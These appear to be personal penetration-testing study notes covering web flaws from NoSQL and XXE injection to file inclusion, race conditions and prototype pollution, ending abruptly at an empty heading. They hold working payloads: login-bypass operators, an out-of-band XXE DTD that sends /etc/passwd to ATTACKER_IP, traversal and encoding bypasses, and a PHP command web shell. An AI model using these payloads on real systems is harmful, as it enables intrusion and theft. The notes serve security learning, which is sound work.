- Injection is similar either it be SQL or NOSQL. The root cause of an injection attack is the improper concatenation of untrusted user input into a command that allows an attacker to alter the command itslef. In NOSQL, even if we cannot escape the current query, we can modify the query itself. Two main types of NoSQL Injection are:

    - Syntax Injection: This is similar to SQL injection where we can escape the query and inject our own payload. The only difference is the syntax used to perform this attack.
    
    - Operator Injection: This can be used if we cannot break out of the current query. In this case, we could inject NOSQL query operator to manipulate the query's behaviour that allows us to stage attacks like authentication bypass. 
    
- NoSQL queries requires nested associative arrays. We must be able to inject arrays into the application to successfully inject NoSQL. PHP and many other server side languages allows us to pass an array in the POST request body which can be useful to check for NoSQL injection using the Operator Injection. 

- Common operators to use in HTTP POST Request body:

    - 'user[$ne]=xxxx&pass[$ne]=yyyy'. This is a way of tricking the database to return any document where the username is not equal to 'xxxx' and the password is not equal to 'yyyy'. Thi has the potential to return all documents in the login collection. 
    
    - 'user[$nin][]=admin&pass[$ne]=abcdef'. This tells the database that we want to login as any user except 'admin' where the password is not equal to 'abcdef'. This way we can log in into other users account by injection such operators. 
    
    - 'user=admin&pass[$regex]=^.{7}$'. This asks the database if there is an username name 'admin' and a password that matches the regex:'^.{7}$'. This basically represent the wildcard word length of 7. If the server responds with a login error, we could find out the length of password by trial and error up to the point the server responds without error. 
    
    - 'user=admin&pass[$regex]=^a.....$'. After finding the length of the password, we could ask the database if the password's first character is'a' and the following dots represents the remaining length of the password. We could enumerate until we get the password of the user like this.
    
## Remediation:

- ensuring there is no confusion between what is query and what is user input. 

- use of parameterised queries, which split the query command and user input.

- using built-in functions and filters of the NoSQL solution to avoid syntax injection.

- input validation and sanitisation to filter syntax and operator characters and remove them.

# XXE Injection

- XXE (XML External Entity) is a type of security flaw that exploits vulnerabilities in an application's XML input. It is usually possible when an application accepts XML input that includes external entity references. It is then used to disclose local files, make server-side requests, or execute remote code. XML is used widespreadly in web applications, particularly in web services and SOAP(Simple Object Access Control)-based APIs.

## XML

- XML (Extensible Markup Language) is a markup language which is derived from SGML (Standard Generalized Markup Language), which is the same standard that HTML is based on. It is basically used to store and transport data in a format that is human readable and machine-parsable. XML consists of elements, attributes, and character data that are used to represent data in a structured and organized way. 

- XSLT:
    
    - XSLT (Extensible Stylesheet Language Transformations) is a language used to transform and format XML documents. Its primary use is for transforming data and formatting. 
    
    - It can be used to facilitate XXE attacks in many ways:
    
        - Data Extraction: XSLT can be used to extract sensitive data from an XML document that can be then used in XXE attack. 
        
        - Entity Expansion: XSLT can expand entities defined in an XML document, including external entities.
        
        - Data Manipulation: can manipualte data in an XML document allowing an attacker to inject malicious data or modify existing data to explaoit an XXE vulnerabililty.
        
        - Blind XXE: can be used to perform blind XXE attacks, where attacker injects malicious entities without seeing the server's response.
        
- DTDs:

    - DTDs(Document Type Definitions) define the structure and constraints of an XML document. They simply specify the allowed elements, attributes, and relationships between them. DDTs can be internal within the XML document or external in a seperate file. Putting simply, they define entities that can be used throughout the XML document, including external entities which are key in XXE attacks.
    
    - Internal DTDs are specified using '<!DOCTYPE>' declaration where external DTDs are specified using the 'SYSTEM' keyword. DTDs play a vital role in XXE injection as it allows to declare external entities which can reference external files or URLs that could lead to code injection or malicious data. 
    
- XML Entities:

    - They are the placeholders for data or code that can be expanded within an XML document. There are five types of entities: internal entities, external entities, character entities, parameter entities, and general entities.
    
- Types of Entities:

    1. Internal Entities are the variables used within an XML document to define and substitute content that might be repeated multiple times. They are defined in DTD and helps to manage repetitive information.
    
    2. External Entities are similar to internal ones, but their contents are referenced from outside the XML document, such as seperate file or URL. This is the thing we are after to exploit XXE. So, if the XML parser is configured to resolve to external entities, we can use it.
    
        <!DOCTYPE note [
        
        <!ENTITY ext SYSTEM "http://example.com/external.dtd">
        
        ]>
        
        <note>
        
            <info>&ext;</info>
            
        </note>
    
    Here, '&ext;' pulls content from the specified URL which could be dangerous if the URL is controlled by an attacker.
    
    3. Parameter Entities are special types used within DTDs to define reusable structures or to include external DTD subsets. They are mainly used for maintaining large-scale XML applications.
    
        <!DOCTYPE note [
        
        <!ENTITY % common "CDATA">
        
        <!ENTITY name (%common;)>
        
        ]>
        
        <note>
        
            <name>Nischal Khadka</name>
            
        </note>
    
    Here, '%common;' is used within the DTD to define the type of data that the 'name' element should have.
       
    4. General Entities are similar to variables and can be declared either internally or externally. 
    
    5. Character Entities are used to represent special or reserved characters that cannot be used directly in XML documents. These entities prevent the parser from being confused reagrding the XML syntax.
    
        - '&lt;' for '<'
        
        - '&gt;' for '>'
        
        - '&amp;' for '&'
        
## XML Parsing Mechanisms:

- XML parsing is a process where the XML document is accessed and manipulated by a software program. These parsers convert data from XML format and structure it so that a program can use (like a DOM tree). If a parser is configured to process external entities, it can lead to unauthorized access to files, internal systems, or external websites.

- Common XML Parsers:

    - DOM (DOcument Object Model) Parser: This method builds the entire XML document into a memory-based tree structure, allowing random access to all parts of the document. 
    
    - SAX (Simple API for XML) Parser: It parses XML data sequentially without loading the whole document into memory, which makes it suitable for large XML files. However, it is less flexible for accessing XML data randomly.
    
    - StAX(Streaming API for XML) Parser: It is similar to SAX parser, but it gives the programmer more control over the XML parsing process.
    
    - XPath Parser: It parses an XML document based on expression and is used extensively in conjuction with XSLT.
    
## In-Band XXE:

- Simply, the in-band refers to any server's response that is immediately disclosed to the attacker. So, if a server responds directly to a XML document POST feature suppose, we can insert malicious DTD by defining the '!ENTITY' 'SYSTEM' and use the character used in the XML element to access the external file and disclose more information.

## Out-of_band XXE:

- On the other hand, Out-of-Band, means out-of-hand. That means we cannot see the server's response to the user input. So, we could try to exfiltrate the data by capturing it in our own controlled server. After we host the server, we could use the DDT with an Entity of SYSTEM and a declaration with our attacking servers IP and port that would be called in the XML document as '&xxe;', which would then connect to our machine's IP. If the connection is established successfully, we could extract the information by creating a DTD file which contains an external entity with a PHP filter to exfiltrate data from the target web application.

        <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
        
        <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
        
        %oobxxe;
    
- This DTD payload begins with an entity of '%cmd' that directly points to a system resource to retrieve contents of '/etc/passwd'. Base64 encoding filter is applied to encode the content in Base64 to avoid formatting problems. The '%oobxxe' entity again has another XML entity declaration 'exfil' that exfiltrates the data to the attacker-controlled server. The paramter '?data=%cmd' sends the Base64-encoded content from '%cmd'. Now, when we go back and change the payload pointing to our machines IP and the file we created, and finally decalring '&exfil;', we would have successfully exfiltrated the contents in our machine. First, the request is made to the file we created to exfiltrate the data, then on the second request the information is diclosed to us. Then, we can use cyberchef or any other tool to decode the Base64-encoded data to gain insights of the information present in '/etc/paswd'.
  
## SSRF + XXE:

- Server-Side Request Forgery attacks occur where an attacker manipulates the functinality of a server to trick it into making request to an unintended location. In the context of XXE, an attacker can manipulate XML input to make server requests to internal services or access internal files. We can use this technique to scan internal networks, access restricted endpoints, or interact with services that are only accessible from the servers local network. So, if a vulnerable server hosts another web application internally on a non-standard port, then we can exploit an XXE vulnerability that makes the server send a request to its own internal network resource. We could make use of Burp Intruder to scan for all the ports and get the vulnerable port number the server is hosting another web application.

## Mitigations:

- Disbale External Entities and DTDs

- Use less complex data formats

- AllowListing input validation.

# Server-Side Template Injection

- SSTI is a vulnerabililty that occurs when user input is injected into a template engine of an application. This could lead to RCE, data exposure, privilege escaltion and DoS. These flaws are often found in web applications that use template engines to generate dynamic content. A template engine is used in web applications to combine static templates with dynamic data. SSTI manipulates the server side logic and potentially execute arbitrary code. 

- Commonly used Template Engines:

    - Jinja2: For Python
    
    - Twig: For PHP
    
    - Pug/Jade: For Node.js
    
- To determine if a web application has an SSTI flaw, first we need to find out the server-side language used to make the template engine. Then, after that we need to know the syntax of that particular engine and how it reacts to certain input. Then, putting the right payload with correct syntax could help in figuring out the presence of an SSTI. 

- SSTImap tool can be used to automate the process of testing and explopiting vulnerabililtes in various template engines. Although, it is a good practice to manually check for flaws related to this. To detect it, we need to have some level of knowledge of server-side languages and the template engines used to properly test the payload relating to the engine being used and the vulnerability being present in there. 

- To prevent from such injections, developers should follow secure coding that includes sandboxing, input validation, and secure configuration of template engines.

# LDAP Injection

- Ligthweight Directory Access Protocol (LDAP) is a widely used protocol for accessing and maintaining distributed directory information services over an IP network. It is often used for authentication and authorization purposes in web and internal applications. 

- In LDAP, directory entries are structured as objects, each being loyal to a specific schema that defines rules and attributes applicable to the object. Services that uses LDAP are Microsoft Active Directory and OpenLDAP.

- LDIF (LDAP Data Interchange Format) is used to represent LDAP entries. LDIF imports and exports directory contents and describes directory modifications such as adding, modifying, or deleting entries. 

## Structure:

- The structure of a LDAP directory follows a hierarchical structure like a file system's tree. This structure then comprises different entries representing a unique item, such as user, group, or resource. At the top of the LDAP tree is the TLD such as dc=example,dc=com. Then, underneath it, there exists subdomains or organizational units (OUs). 

- Distinguished Names (DNs): serves as unique identifiers for each entry in the directory that specifies the path from the top of the LDAP tree to the entry. For example, cn=Nischal Khadka,ou=people,dc=example,dc=com.

- Relative Distinguished Names (RDNs): represents individual levels within the directory hierarchy, like cn=Nischal Khadka, where cn stands for Common Name.

- Attributes: defines the properties of directory entries like mail=nischal@google.com for an email address.

## Search Queries:

- LDAP search queries are crucial for interacting with the directories inside it. An LDAP search queries have serveral components that serves a specific function in the search operation:

    1. Base DN: starting point of the directory tree (like root).
    
    2. Scope: defines how far the search should fo from the base DN. 
    
        - base (search the base DN only)
        
        - one (searches the immediate children of the base DN)
        
        - sub (search the base DN and all of its descendants)
        
    3. Filter: criteria entry to have specific search
    
    4. Attributes: defines which characteristic of the matching entries should be returned in the results.
    
- Basic syntax for and LDAP search query look like:

    (base DN) (scope) (filter) (attributes)
    
- When LDAP services are publicly accessible, we can use tools such as 'ldapsearch', which is a part of the OpenLDAP suite to interact with the LDAP server. LDAP services are accessible on port 389 (for unencrypted connections) and 636 (for TLS/SSL connections).

## Injection:

- LDAP injection exploits the way web application construct LDAP queries. It is similar to SQL injection, where SQL statements are injected into queries to manipulate database operations, but in LDAP injection the malicious code targets the LDAP queries.

- We can exploit a vulnerable LDAP query to inject malicious LDAP filters such as '*'. AS, '*' always returns to true in the LDAP directory which is a kind of a wildcard.

## Authentication Bypass Techniques:

- Tautology-Based Injection:

    - It invloves inserting conditions into an LDAP query that are inherently true despite the intended logic of the application. This injection can be effective if the username and password are inserted directly from user input (unsanitised). We can craft a query that could fool the LDAP authentication that we are true and let us in.  
    
## Blind LDAP Injection:

- As the name suggests, we are blind to the results of our payload to this type of injection. 

- We could make use of Boolean-based blind LDAP injection. For example: 'a*)(|(&' for username and 'pwd)' for password. What this does is '*' matches any entry with the attribute. Then, '(|(&' says any two conditions enclosed needs to be true for the filter to pass. In LDAP, and empty AND (&) condition is always considered true, so as the password is not true, the first condition sets to true and the format defined will successfully have an entry in the LDAP query resulting in the successfull authentication in my opinion. The character 'a' is the first name of the user, so we can enumerate the whole username of an user till we get it looking at the errors the application throws. 

# ORM Injection

- ORM (Object Relational Mapping) is a programming technique that facilitates data conversion between incompatible systems using object-oriented programming languages. It basically lets developers to interact with a database using the programming language's native syntax, making data manipulation more intuitive and reducing the need of extensive SQL queries. It serves as a bridge between the object-oriented programming model and the relational database model. Here, the developers work with objects rather than tables and rows.

- Commonly used ORM frameworks:

    - Doctrine (PHP)
    
    - Hibernate (JAVA)
    
    - SQLAlchemy (Python)
    
    - Entity Framework (C#)
    
    - Active Record (Ruby on Rails)
    
## How ORM Works?

- Simply stating, ORM is a technique which simplifies data interaction in an application by mapping objects in code to database tables. Commonly, the process involves defining classes that represents tables in a database and their relationships. And, each class property relates to a column in the table while each class instance represents a row. 

- ORM frameworks streamline common database operations like CRUD operations.

- ORM injection is similar to SQL injection as they both target to exploit vulnerabililtes in database interactions, however they target different levels of the stack:

    - SQL Injection: It targets raw SQL queries which allows attackers to manipulate the SQL statements directly. It can be achieved by injecting malicious input into query strings. 
    
    - ORM Injection: It targets the ORM framework, exploiting how it constructs queries from object operation. We can manipulate the ORM's methods and properties to influence the resulting SQL queries.
    
## Identifying ORM Injection:

- Manual Code Review: A manual code inspection of the source code could reveal some raw query methods that might be vulnerable. The main focus is to look for concatenated strings or unescaped inputs in ORM methods that could trigger the injection.

- Automated Scanning: Use of security scanning tools could also help in detecting ORM injection vulnerabilities. 

- Input Validation Testing: Performing manual testing by injecting payloads into application inputs to see how they react and if they affect the ORM query can be useful. For example, injecting SQL control characters or keywords to determine the execution of the query.

- Error-based Testing: Just play with the input field and get to know the behaviour of how it throws the errors.

# Insecure Deserialisation

- This exploit occurs when an application trusts serialised data enough to use it without validating its authenticity. So, an attacker can manipulate serialised objects to achive RCE, escalate privileges, or launch denial-of-service attacks.

## Serialisation:

- Serialisation is the process of transforming an object's state into a human-readable or binary format that can be stored or transmitted and reconstructed when required. This concept of programming is very important in applications where data must be transferred between different parts of the system or across a network, such as web-based applications. Every OOP-based languages has its own way of serialising and deserialising object data.

## Deserialisation:

- It is simply a process where the data that have been serialised before transmitting over the network or system is converted or formatted back into an object. It is important for retrieving data from files, databases, or across networks, restoring it to its original state for use. Insecure deserialisation leads to security vulnerabilities where an attacker might alter the serialised objects to execute unauthorised actions or steal data.\

## Serialisation Formats:

- Based on the programming language used, keywords and functions differ for serialisation, but the concept remains the same in each of them. 

- PHP Serialisation:
    
    - obejct or array is serialised using the 'serialize()' function, where it converts into a byte stream that represents the object's data and structure. The resulting byte stream can include various data types such as strings, arrays, and objects making them unique.
    
    - Magic Methods:
            
            - __sleep(): called before serialisation
            
            - __wakeup(): invoked upon deserialisation
            
            - __serialize(): customise the serrialised data by returning an array representing the object's serialised form
            
            - __unserialize(): restores the serialized data to its original form
            
- Python Serialisation:

    - Python uses 'Pickle' to serialise and deserialise objects. This module converts a Python object into a byte stream (and vice versa) which enables it to be saved to a file or transmitted over a network. A representation of how python serialises and deserialises objects is given below:
    
            import pickle
            
            import base64

            serialized_data = request.form['serialized_data']
            
            notes_obj = pickle.loads(base64.b64decode(serialized_data))
            
            message = "Notes successfully unpickled."

            elif request.method == 'POST':
            
                if 'pickle' in request.form:
                
                    content = request.form['note_content']
                    
                    notes_obj.add_note(content)
                    
                    pickled_content = pickle.dumps(notes_obj)
                    
                    serialized_data = base64.b64encode(pickled_content).decode('utf-8')
                    
                    binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
                    
                    message = "Notes pickled successfully."
            
    - Here, an object of a class 'Notes' is referred as 'notes_obj'. Basically, the class is used for managing a list of notes in this web application to manage the applications state. So, in the process of serialisation, when a user submits a note, the Notes class instance (including all notes) is serialised using 'pickle.dumps()'. This function transforms the Python object into binary format that Python can later turn back into an object during deserialisation. Then, the serialised data is encoded with Base64 because binary data contain bytes that may interfere with communication protocols like HTTP. Then, when unpickling, the base64 string is first decoded back into binary format using 'base64.b64decode()'. Then, finally the function 'pickle.loads()' reconstructs the original Python object from the binary system.
    
    - So, the concept here is when a string is entered into the instance of the notes class, it is pickled, converted into binary format, encoded with base64 and added to the content. Then, the unpickling is done by removing the base64 encode, and turning it back to the binary format which is then turned into the original state of the object before serialising.
    
- Other Lnaguages:

    - Java: Serializable interface
    
    - .NET: System.Text.Json (For Json serialisation) and System.Xml.Serialisation (For XML documents)
    
    - Ruby: Marshal Module
    
## Identification:

- If we are white-box testing, then analysing the source code might help. Looking for the functions that serialises and deserialises an object can be helpful to see if the user-supplied input is passed directly to these functions.

- If we are black-box testing without any access to the source code, we can analyse the pattern of the server responses and cookies that might indicate the use of serialisation and potetnial vulnerabilites. External obseravations and interactions is a must to test for insecure deserialisation. Certain error messages can indirectly indicate issues with serialisation. We can also check for unexpected behaviour in response to manipulated input which might suggest issues with how data is deserialised. Another great way is to examine cookies. Cookies are often used to store serialised data in web applications. So, we could look for cookie values that might look like base64 encoded which can be then decoded and the serialised objects or data structures can be manipualted to check for vulnerabilities.

## Exploitation - Object Injection:

- Pu it simply, serialisation and deserialisation means encrypting and decrypting objects state. So, if there is an insecure deserialisation done by the programmer, we can exploit it by manipulating the serialised data to execute arbitrary code of our own. Suppose a PHP web application is vulnerable to deserialisation. From source code analysis, or considering if the framework is open source, we can identify the vulnerability present. It is possible to manipulate the properties of an object by crafting our own serialised string that should contain the desired property value being using by the application. So, by preparing the payload and getting the serialised base64 encoded string will be useful to manipualte the web application to decode it, and execute our desired intentions.

## Automation Scripts:

- PHP Gadget Chain (PHPGGC):

    - It is a primary tool for generating gadget chains used in PHP object injection attacks. It is specifically tailored to exploit vulnerabilites related to PHP object serialisation and deserialissation. 
    
- Functionality:

    - Gadget Chains: PHPGGC has a library of gadget chains for various PHP frameworks and libraries. These chains are sequences of objects and methods designed to exploit specific vulnerabilities.
    
    - Payload Generation: Its main purpose is to generate serialised payload that can trigger these vulnerabilites. It helps in creating payloads that demonstrate the impact of insecure deserialisation flaws.
    
    - Payload Customization: We can customize the payload to achieve specific outcomes by specifying arguments for the functions or methods involved in the gadget chain.
    
            $ php phpggc -l 
        
    
- Yoserial for Java:

    - It is a widely recognized exploitation tool to test security of JAVA applications against serialisation vulnerbailites. It helps in generating paylaods that exploits these vulnerabilites. 
    
            $ java -jar ysoserial.jar [payload type] '[command to execute]'
    
# SSRF

- Server-Side Resource Forgery is a web application security vulnerability which allows an attacker to force the server to make unauthorised requests to any local or external source on behalf of the web server. Simply, this flaw allows an attacker to interact with internal systems which can potentially lead to data leaks, service disruption, or even remote code execution.

- An SSRF can be implemented when an user-provided data is used to construct a request, such as forming a URL. To execute an SSRF attack, we can manipulate a parameter value within the vulnerable software which maight lead to create or control requests from the software and directing them towards other servers or even the same server. While most SSRF vulnerabilites are present in web applications and other networked software, it can also be present in server software.

## SSRF against a Local Server:

- If the parameter in the url lacks enough and safe filtering, then it loads whatever the parameter is provided from the 'localhost'. This type of flaw usually exists due to how the application handles input from the query parameter or API calls. So, by changing the URL parameter to point to other pages/services that are not meant to be seen by outsiders, then it can present a big risk for the web application. 

## Accessing an Internal Server:

- In web applications, it is common for front-end web applications to interact with back-end internal servers. These servers are usually hosted on non-routable IP addresses, so a normal user could not access them. However, an attacker can exploit a vulnerable web application's input validation to trick the server into requesting internal resources on the same network. So, if we find a content being displayed in a web application with the internal server, such as '10.10.10.10/content.php', then we can simply change the content to be admin or any reosurce that a normal user has not permission to access. Then, the server makes a valid request to the web server, and gives us a legitimate page on the file we requested that are meant to be hidden.

## Blind SSRF:

- If we are blind to the responses of the server, we can use Out-Of-band SSRF to leverage a seperate out-of-band communication channel instead of directly receiving responses from the target server to receive information or control the exploited server. So, by making DNS requests or any other requests to the domain or server an attacker controls, they can interpret if an SSRF vulnerability exists on the system or not. If present, internal IP addresses or the internal network's structure is exposed to the attacker.

## Remidiation:

- Implement strict input validation

- Maintain allowlist of trusted URLs or domains instead of blocklist or filter

- Implement network segmentation to isolate internal resources from external access

- Implement comprehensive logging and monitoring

# File Inclusion and Path Traversal

- These vulnerabilities arise when an application allows external input to change the path for accessing files that are restricted for public view. This flaw primarily occurs from improper handling of file paths and URLs which can allow an attacker to include files which are not intended to be part of the web application, leading to unauthorized access or execution of code. 

## File Inclusion Types:

- Basics of File Inclusion:
    
    - A traversal string '../', is used in path traversal attacks to navigate through the directory structure of a file system. It is basically a string to move up one directory level. Relative pathing means locating files based on the current directory. Whereas, absolute pathing means specifying the complete path starting from the root directory. For example, '/var/www/html/foler/file.php' is an absolute path.
    
- Remote File Inclusion:

    - RFI is a vulnerability where an attacker can include remote files, often through input manipulation. It occurs in applications that dynamically include external files or scripts. In such cases, an attacker can manipulate the parameters in a request and point it to an external malicious files.
    
- Local File Inclusion:

    - LFi occurs when an attacker exploits a vulnerable input filed to access or execute files on the local server. So, an attacker can basically exploit poorly sanitized fields to manipulate file paths to gain access outside of the intended directory. Using a traversal string is a good technique to implement such attacks like 'include.php?page=../../../../etc/passwd'. While it seems like LFI only leads to unauthorised file access, it can also escalte to RCE. If an attacker can upload or inject executable code into a file that is later included or executed by the server, they can attain RCE. One of the common techniques attackers love is log poisoning, where they inject code into log files and then when the web server includes the malicious log file, LFI can lead to RCE.
    
## PHP Wrappers:

- They are a part of PHP's functionality which allows users access to various data streams. Wrappers can access and execute code through built-in PHP protocols that may lead to significant security risks if not handled properly. Some of the different string filters for a traget file '.htaccess' in PHP are:

        php://filter/convert.base64-encode/resource=.htaccess
    
        php://filter/string.rot123/resource=.htaccess
    
        php://filter/string.toupper/resource=.htaccess
    
        php://filter/string.tolower/resource=.htaccess
    
        php://filter/string.strip_tags/resource=.htaccess
    
- Data Wrappers:

    - Data wrapper is another functionality of PHP wrapper which allows inline data embedding. It is used to embed small amounts of data directly into the application code. A common payload for this wrapper looks like this:
    
            data:text/plain,<?php phpinfo(); ?>
        
## Base Directory Breakouts:

- In modern web applications, safeguards are in place to prevent path traversal attacks. However, they are not always safe. We can bypass insecure input handling if a server is implementing or missing out major practices by using the following payload:

        ?file=/var/www/html/..//..//..//etc/passwd
    
- '..//..' are still equally equivalent to '../..'

- Obfuscation:

    - These techniques are used to bypass basic security filters that might be in place. So, by obfuscating the sequences, we can still navigate through the server's filesystem. We could achieve this by encoding the paylaod. So, the traversal string '../' can be written as '%2e%2e%2f'. We could also use double encoding if the application decodes input twice like this '%252e%252e%252f'. Obfuscation can also be achieved by using payloads like '....//', which might help in being undetected by simple string matching or filtering mechanisms. 
    
## Log Poisoning:

- It is a technique where an attacker injects executable code into a web server's log file and then uses LFI vulnerability to include and execute this lof file. It can be done in various ways such as crafting an evil user agent, sending payload via URL using netcat, or a referrer header that the server logs. Once the code is in the log file of the web server, the attacker can exploit the vulnerability to include it as a standard server file. This causes the server to execute the malicious code contained in the log file which can lead to RCE.

## LFI2RCE - Wrappers:

- PHP wrappers are not only used to read the files but aldo for code execution. If we take the base64 filter as an example, it can allow an attacker to execute arbitrary code on the server using a base64-encoded payload. For example:

        <?php system(_$GET['cmd']); echo 'Hello World'; ?>
  
  When this payload is encoded to base 64 and then included in the PHP wrapper, we could get a code execution on the web page. The final payload would look like 'php://filter/convert.base64-decode/resource=data://plain/text, [base64 encoded PHP snnipet]'.
  
## Mitigations:

- Ensuring all user inputs are properly validated and sanitized.

- Implementing allowlisting for file inclusion and access.

- Configuring server settings to disallow remote file inclusion and limit the scripts to access the file system.

# Race Conditions

- Race conditions vulnerability arises when a variable gets accessed and modified by multiple threads. It happens because of the lack of proper lock mechanisms and synchronization between different threads. So, an attacker might exploit this vulnerbaility to make a transaction multiple times to deceive the system which is beyound their balance. 
    
## Multi-Threading:

- Program:

    - a set of instructions to achieve a specific task that needs to be executed to be completed.
    
- Process:

    - A process is a program in execution. Unlike a program which is static, a process is a dynamic entity. Some of its ket aspects are:
    
        - Program: executable code related to the process.
        
        - Memory: temporary data storage.
        
        - State: a process whihc usually hops between different states. New state (just created) -> Ready state (ready to run once given CPU time) -> Running state (currently running) -> Waiting state -> Terminated state. Waiting state is a state that waits for the permission before it is in the ready state.
        
- Threads:

    - A thread is a lightweight unit of execution. It shares various memory parts and instructions with the process. There are two main approaches for running threads. One is serial, that serves one user after the other sequentially. New users are enqueued. Another is parallel where is creates a thread to serve every new user. Here, the new users are only enqueued if the maximum number of running threads is reached. 
    
## Race Condtions Methodolody:

- Suppose we book a hotel room for a vacation. The host confirms the availability of the room and makes a reservation for us. So, then another customer calls another host and makes the reservation for the same hotel room. The other host not knowing the room has been already reserved will make this reservation for the another client as well. So, who really reserved the room? This is called race condition. Here, the two hosts who are making the reservation are "threads". Simply putting, when one thread checks a value to perform an action, another thread might change that value before the action takes place, or is updated. So, a race condition usually happens when mutiple request have been made by the user at the same time, before the thread has a chance to update the updated value or data. So, if threads is inappropriately handled, race condtions happen especially on online banking services. Even in more simple terms, the conflict between the threads that handle data modification between shared resources.

- The most important thing to exploit a race condtion is understanding how the server is built such as the states in business logic of a web architecture. So, if a client passes through multiple states before a transaction is marked as complete in a web application, we could perform this action multiple times but before the thread is passed through each states. The only thing to keep in mind before exploiting race condition is timimg. So, if we can send requests to the server simultaneously for like milliseconds apart then the duplicated requests will reach the server and conflict the threads to perform the action that is not supposed to make. 

## Exploiting Race Conditions:

- Check how the server responds to a successfull transaction in burp suite.

- Use the repeater, create a tab group, then duplicate it like 20 times for testing.

- To send duplicated requests, there are three choices we can make from:

    - Send group in sequence (single connection): This option establishes a single connection to the server and sends all the requests in the groups tabs before closing the connection. This is useful for testing potential client-side desync vulnerabillites.
    
    - Send group in Sequence (Seperate connection): This option first establishes a TCP connection, sends a single request from the group, then closes the TCP connection of the first request before repeating the process for other requests.
    
    - Send group in parallel: This option lets us to send the group's request in parallel, which means sending all the requests in the group at once. 
    
## Detection and Mitigation:

- We as a penetration testers must have the knowledge of how the system behaves under normal conditions when enforced controls are enforced. The controls can be: use once, vote once, rate once, limit to balance, and limit to one every 5 minutes. Then, we could try to break this limit by exploiting race conditions.

- Few of the mitigation techniques are:

    - Synchronization Mechanisms: In a shared resource, only one thread must be given permission to acwuire the lock at a time as most modern programming languages provide synchronization mechanisms like locks. 
    
    - Atomic Operations: It refers to indivisible execution units, a set of instructions grouped together and ececuted wihtout operation. This approach ensures that an operation can finish without being interrupted by another thread. 
    
# Prototype Pollution

- This vulnerability allows attackers to manipulate and exploit the inner workings of JavaScript applications and gain access to sensitive data and application backend. While it is most commonly discussed in the context of JavaScript, the concept can apply to any system that uses a similat prototype-based inheritance model. For language models like JAVA and C++, this might not be a common practice because they follow a class-based inheritance. These are typically static and altering a class at a runtime to affect all of its instances might not be a good idea. 

## Essentials:

- Objects:

    - Objects are the building blocks that hold information of property. Inheritance is like passing down traits from one object to another like your ancestors passed down their genes to you. So, an object is basically an instance of a class in OOP context. The object is basically used to store specific information, organize and manage related data, making them a fundamental concept in building dynamic and interactive applications.
    
- Classes:

    - In JavaScript, classes act as a blueprint that helps to create multiple objects with similar structures and behaviours. With the help of a class, we can instantiate objects with shared characteristics. Properties are created in a class in a constructor and can be called using "this.property=property".
    
- Prototype:

    - Every object in JS is linked to a prototype object, which acts as a chain of command that needs to be followed by its child object. It is commonly referred as the prototype chain. This prototype then serves as a template or blueprint for objects. If an object is created using a constructor function or a class, JS automatically sets up a link between the object and its prototype. A simple representation of object inhereting from its prototype looks like this:
    
                   
                // Prototype for User 
                
                let userPrototype = {
                
                 greet: function() {
                 
                    return `Hello, ${this.name}!`;
                    
                }
                
                };
            
                // User Constructor Function
                
                function UserProfilePrototype(name, age, followers, dob) {
                
                    let user = Object.create(userPrototype);
                    
                    user.name = name;
                    
                    user.age = age;
                    
                    user.followers = followers;
                    
                    user.dob = dob;
                    
                    return user;
                    
                }

                // Creating an instance
                
                let regularUser = UserProfilePrototype('Nischal K', 23, 1000, '11/18/2002');

                // Using the prototype method
                
                console.log(regularUser.greet());

- Difference between class and prototype:

    - In JS, both of them are used to achieve a similar goal, which is creating objects with behaviours and characteristics. To understand the concept simply, classes is like having a detailed blueprint or a set of instructions for each model we want to develop. We folloe this blueprint exactly to create a model which have the exact same features and behaviours. While, a prototype is like having a basic model when can be then customised or modified by adding features directly on the model itself. With prototypes, we start with a simple object, then behaviours are added to the object by linking it to a prototype object that already has those behaviours. So, and object created this way are linked through the prototype chain, allowing them to inherit behaviours from other objects. This method is more dynamic and flexible.
    
- Inheritance:

    - Inheritance is simply inhereting properties from one object to another one, creating a hierarchy of related objects. This trait helps to create a more specialised object while resuing the common properties from a parent object. JavaScript supports both classes and prototype-based inheritance.
    
        - Prototype-based Inheritance: 'Object.create()' is used to create a new object with a specified prototype or we can directly modify the prototype of an existing object using its prototype property.
        
        - Class-based Inheritance: JS also supports classes that provides a more familiar syntax for defining objects and inheritance. Under the hood, classes still use prototypes.
        
## How it Works?

- A prototype pollution is a vulnerability that arises when an attacker manipulates an object's prototype, impacting all the instances of that object. So, an attacker can exploit this flaw by modifying shared properties or injecting malicious behaviour across objects.

- Prototype pollution alone might not always expose a exploitable threat however, it's impact is severely increased if it joins with other types of vulnerabilities such as XSS and CSRF.

- In JS, the '__proto__' property is a common way to access the prototype of an object, which points to the object from which it inherits its properties and methods. So, an attacker can execute this property to inject malicious behaviours of across objects or modify shared properties using any attack vector like XSS, CSRF etc. 

## Exploitation - XSS:

- We know that multiple properties are inherently present on the Object prototype in JavaScript. The most common properties that stand out are 'constructor' and '__proto__' which are the preferred targets for exploitation by attackers. The constructor property points to the function that constructs an object's prototype, while __proto__ is a reference to the prototype object that the current object directly inherits from. 

- Golden Rule:

    - This rule focuses on an attacker's ability to influence certain key parameters, such as 'x' and 'val', in expressions like 'Person[x][y] = val'. So, if an attacker sets __proto__ to 'x', the attritube defined by 'y' is universally set across all objects sharing the same class as the object with the value denoted by 'val'.
    
- Few Important Functions:

    - When looking for potential prototype pollution, we should focus on commonly used vectors/functions that is vulnerable to prototype pollution. So, it is very important to know how an application handles object manipulation.
    
    - Property Definition by Path: Functions that set object properties based on a given path like 'object[a][b][c] = value', it can be dangerous if the path components are controlled by user input. Suppose an endpoint allows users to update reviews about any friend in a web app. Then, we can update the path to target the prototype with this payload:
    
        { "path": "reviews[0].content", "value": "&#60;script&#62;alert('xss')&#60;/script&#62;"
        
        Here we used the _set function from lodash property to apply the payload and adding the review content to the specified path within a profile's object assuming the '_set' function is sued. By doing code analysis, we can perform property definition by path attack.
        
## Exploitation - Property Injection:

- Object Recursive Merge is a function that recursively merges properties from source objects into a target object. An attacker can exploit this functionality if the merge function does not validate its input and allows merging properties into the prototype chain. So, we can pollute the prototype by sending request that contains '__proto__' with a 'newProperty' and value as:

    {"__proto__": {"newProperty": "hacked"}}
    
  The merge function will consider the __proto__ as a property and will call the 'obj.__proto__.newProperty=value'. So, by doing this the newly added property is not directly added to the current object, but it is added to the object's prototype. 
  
## Exploitation - Denial of Service:

